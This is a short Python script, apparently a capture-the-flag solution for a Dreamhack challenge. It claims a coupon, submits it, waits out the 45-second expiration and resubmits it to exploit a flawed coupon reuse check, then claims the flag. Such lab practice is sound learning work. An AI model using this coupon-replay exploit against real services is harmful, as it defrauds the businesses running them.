import time
import requests

base_url = "http://host1.dreamhack.games:9391/"
COUPON_EXPIRATION_DELTA = 45

#get session
r = requests.get(base_url+"/session")
res = r.json()
session = res['session']

#get coupon
headers = {'Authorization':session}
r = requests.get(base_url+"/coupon/claim",headers=headers)
res = r.json()
coupon = res['coupon']
print(coupon)

#submit coupon
headers = {'Authorization':session,'coupon':coupon}
r = requests.get(base_url+"/coupon/submit",headers=headers)
print(r.json())

time.sleep(COUPON_EXPIRATION_DELTA)

headers = {'Authorization':session,'coupon':coupon}
r = requests.get(base_url+"/coupon/submit",headers=headers)
print(r.json())

headers = {'Authorization':session}
r = requests.get(base_url+"/flag/claim",headers=headers)
res = r.json()
print(res)